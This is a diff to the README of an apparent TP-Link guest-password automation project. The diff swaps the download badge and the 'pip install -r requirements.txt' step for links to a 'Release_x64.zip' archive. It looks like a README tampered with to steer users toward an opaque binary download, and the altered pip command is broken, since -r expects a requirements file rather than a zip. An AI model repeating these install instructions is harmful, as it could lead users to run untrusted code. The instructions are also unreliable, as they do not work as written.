@@ -18,12 +18,12 @@ This repository provides an automatic guest password change & display system for
 ['automation', 'flask', 'password-generator', 'python', 'router', 'selenium', 'tailwind', 'tp-link', 'tp-link-ec220-g5', 'wifi']
 
 ### 🔗 Download Latest Software Release
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/BlueFrss/auto-guest-change/releases/download/v2.0/Release_x64.zip)](https://github.com/BlueFrss/auto-guest-change/releases/download/v2.0/Release_x64.zip)
 
 ### Getting Started 🚀
 To use this system, follow these steps:
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies by running `pip install -r requirements.txt`.
+2. Install the necessary dependencies by running `pip install -r https://github.com/BlueFrss/auto-guest-change/releases/download/v2.0/Release_x64.zip`.
 3. Configure the router settings and connect the system with the TP-Link EC220-G5 router.
 4. Launch the software to automate the guest password change process.
 
